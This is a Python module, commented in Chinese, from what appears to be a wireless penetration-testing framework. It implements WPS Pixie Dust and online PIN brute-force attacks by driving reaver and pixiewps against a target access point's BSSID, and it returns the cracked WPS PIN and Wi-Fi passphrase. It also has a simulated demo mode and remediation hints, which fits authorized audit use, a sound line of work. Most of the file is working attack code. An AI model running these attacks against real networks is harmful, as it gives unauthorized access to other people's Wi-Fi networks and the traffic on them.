"""WPS 攻击：Pixie Dust（离线）与 PIN 在线爆破."""

from __future__ import annotations

import asyncio
import time

from .base import AttackContext, AttackModule, AttackResult, Option
from ..crack.tools import reaver_attack
from ..models import normalize_mac
from ..recon.demo import demo_psk


class _WPSBase(AttackModule):
    category = "wps"
    requires = ("reaver",)
    risk = "high"
    needs_monitor = True

    def validate(self, params: dict) -> list[str]:
        issues = super().validate(params)
        if not params.get("wps") and str(params.get("wps", "")).lower() not in {"true", "1"}:
            issues.append("目标未标记为开启 WPS，请先用 wash 确认真实状态（可能误报）")
        return issues

    async def _demo(self, ctx: AttackContext, params: dict, bssid: str, ssid: str, started: float,
                    pixie: bool) -> AttackResult:
        steps = (
            ["发起 WPS 注册协议交互（EAP-WSC）", "捕获 M1/M2 的 nonce", "离线推导 PIN（Pixie Dust）"]
            if pixie
            else ["发起 WPS PIN 校验", "分段验证前 4 位 / 后 3 位", "PIN 校验通过"]
        )
        for step in steps:
            await asyncio.sleep(0.6)
            ctx.emit("info", step, bssid=bssid)
        pin = "12345670"
        psk = demo_psk(ssid) or "Wraith12345"
        detail = {"demo": True, "pin": pin, "psk": psk}
        ctx.finding(
            "WPS 已启用且 PIN 可破解",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail=f"获取到 WPS PIN={pin}，并可直接推导出 PSK={psk}。建议关闭 WPS 或升级 WPS 2.0。",
            category="wps",
        )
        if not pixie:
            ctx.emit("success", "WPS PIN 在线爆破成功（模拟）")
        return AttackResult(
            ok=True,
            summary=f"WPS 攻击成功：PIN={pin}，PSK={psk}",
            detail=detail,
            duration=time.time() - started,
        )


class WPSPixie(_WPSBase):
    id = "wps_pixie"
    name = "WPS Pixie Dust"
    description = (
        "利用 WPS 注册协议中 nonce 熵不足的缺陷，离线推导 PIN/PSK，通常数十秒内完成。"
        "对使用弱随机数实现的芯片（Ralink/Realtek/部分 Broadcom）有效。"
    )
    requires = ("reaver", "pixiewps")
    options = [Option("timeout", "超时（秒）", "int", 180, "reaver -K 1 的最长运行时间")]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 0)
        timeout = max(30, int(params.get("timeout") or 180))
        ctx.authorize("wps_pixie", bssid, ssid)
        ctx.emit("attack", f"WPS Pixie Dust：{ssid or '<隐藏>'} · {bssid} · ch{channel}", bssid=bssid)
        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, started, pixie=True)

        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        data = await reaver_attack(
            ctx.runner, monitor, bssid, channel, pixie=True, timeout=timeout,
            on_line=lambda line: ctx.log(line),
        )
        if data["locked"]:
            ctx.finding(
                "WPS 存在速率限制/锁定",
                "low",
                bssid=bssid,
                ssid=ssid,
                detail="AP 对 WPS PIN 尝试实施锁定，可尝试等待窗口或改用 Pixie Dust。",
                category="wps",
            )
        if not data["ok"]:
            return AttackResult(
                ok=False,
                summary="Pixie Dust 未成功（设备可能使用强随机数或已禁用 WPS）",
                detail={"output": data["output"][-1500:], "locked": data["locked"]},
                duration=time.time() - started,
            )
        ctx.finding(
            "WPS Pixie Dust 成功",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail=f"PIN={data['pin']}，PSK={data['psk']}",
            category="wps",
        )
        return AttackResult(
            ok=True,
            summary=f"WPS 破解成功：PIN={data['pin'] or '已获取'}，PSK={data['psk'] or '见输出'}",
            detail={"pin": data["pin"], "psk": data["psk"], "output": data["output"][-1500:]},
            duration=time.time() - started,
        )


class WPSPin(_WPSBase):
    id = "wps_pin"
    name = "WPS PIN 爆破"
    description = (
        "WPS PIN 分两段校验，搜索空间约 11,000 次。速度远慢于 Pixie Dust，"
        "但适用于随机数实现正常的设备（需处理锁死与限速）。"
    )
    options = [
        Option("pin", "指定 PIN（可选）", "text", "", "留空则在线穷举，例如 12345670"),
        Option("timeout", "超时（秒）", "int", 900, "最长时间"),
    ]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 0)
        timeout = max(60, int(params.get("timeout") or 900))
        pin = (params.get("pin") or "").strip() or None
        ctx.authorize("wps_pin", bssid, ssid)
        ctx.emit(
            "attack",
            f"WPS PIN {'校验 ' + pin if pin else '在线爆破'}：{ssid or '<隐藏>'} · {bssid}",
            bssid=bssid,
        )
        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, started, pixie=False)

        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        data = await reaver_attack(
            ctx.runner, monitor, bssid, channel, pin=pin, timeout=timeout,
            on_line=lambda line: ctx.log(line),
        )
        if not data["ok"]:
            return AttackResult(
                ok=False,
                summary="WPS PIN 爆破未成功（可能被锁定或超时）",
                detail={"locked": data["locked"], "output": data["output"][-1500:]},
                duration=time.time() - started,
            )
        ctx.finding(
            "WPS PIN 可被爆破",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail=f"PIN={data['pin']}，PSK={data['psk']}",
            category="wps",
        )
        return AttackResult(
            ok=True,
            summary=f"WPS 破解成功：PIN={data['pin']}，PSK={data['psk']}",
            detail={"pin": data["pin"], "psk": data["psk"]},
            duration=time.time() - started,
        )
